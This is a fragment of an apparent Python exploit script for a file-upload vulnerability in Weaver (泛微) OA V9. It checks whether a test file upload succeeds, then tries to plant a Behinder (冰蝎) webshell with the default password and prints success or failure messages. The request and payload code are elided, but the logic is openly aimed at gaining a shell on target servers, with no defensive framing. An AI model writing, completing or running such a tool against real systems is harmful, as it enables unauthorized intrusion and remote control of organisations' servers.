...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测泛微OA V9 文件上传漏洞")
    try:
        ...
        if cs.status_code == 200 and '123456' in cs.text:
            print(now_time() + ' [SUCCESS]  测试文件上传成功:{}'.format(exp_url))
            print(now_time() + " [INFO]     正在尝试GETSHELL")
            ...
            if GS.status_code == 200:
                print(now_time() + ' [SUCCESS]  冰蝎默认密码文件上传成功:{}'.format(exp_url))
            else:
                print(now_time() + ' [WARNING]  上传失败，原因可能存在防火墙请手动上传')
        else:
            print(now_time() + ' [WARNING]  泛微oa V9 文件上传漏洞不存在')
    except:
